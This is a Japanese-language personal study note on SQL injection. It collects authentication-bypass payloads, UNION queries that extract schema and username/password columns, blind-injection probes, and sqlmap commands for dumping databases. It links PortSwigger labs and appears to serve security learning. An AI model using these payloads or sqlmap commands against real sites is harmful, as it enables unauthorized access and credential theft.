---
tags: [hacking, skill, web, sql-injection]
category: Web Attacks
difficulty: beginner-intermediate
learned_from:
date: 2026-03-19
---

# SQL Injection (SQLi)

## 概要
Webアプリのデータベースクエリに悪意あるSQLを注入する攻撃。

## 使いどころ
- ログインバイパス
- データベース内の情報抽出
- ファイル読み書き（権限があれば）

## 基本確認

```
' → エラーが出ればSQLi可能性あり
'' → エラーが消えれば確定
1' OR '1'='1  → 常にTrueにする
```

## 手法別

### 認証バイパス
```sql
' OR 1=1 --
' OR '1'='1' --
admin'--
' OR 1=1#
```

### UNIONベース（カラム数特定）
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   ← エラーになったらカラム数は2

' UNION SELECT NULL, NULL--
' UNION SELECT 1, 2--
```

### データ抽出（MySQL）
```sql
-- データベース一覧
' UNION SELECT schema_name,NULL FROM information_schema.schemata--

-- テーブル一覧
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='対象DB'--

-- カラム一覧
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='対象テーブル'--

-- データ取得
' UNION SELECT username,password FROM users--
```

### ブラインドSQLi（真偽判定）
```sql
' AND 1=1--    → True（正常表示）
' AND 1=2--    → False（変化）

-- 1文字ずつ確認
' AND SUBSTRING(username,1,1)='a'--
```

## ツール: sqlmap

```bash
# 基本
sqlmap -u "http://target/page?id=1"

# POSTデータ
sqlmap -u "http://target/login" --data="user=foo&pass=bar"

# DBを列挙
sqlmap -u "..." --dbs

# テーブルを列挙
sqlmap -u "..." -D <DB名> --tables

# データをダンプ
sqlmap -u "..." -D <DB名> -T <テーブル名> --dump

# Cookie付き（ログイン後）
sqlmap -u "..." --cookie="session=xxx"
```

## ハマったポイント
- コメント文字はDB種別による: MySQL=`--` or `#`, MSSQL=`--`, Oracle=`--`
- URLエンコードが必要な場合あり（Burp Suiteで確認）

## 参考リンク
- [PortSwigger SQLi Labs](https://portswigger.net/web-security/sql-injection)
- [HackTricks: SQLi](https://book.hacktricks.xyz/pentesting-web/sql-injection)

## 関連スキル
- [[Burp-Suite]]
- [[Web-Enumeration]]
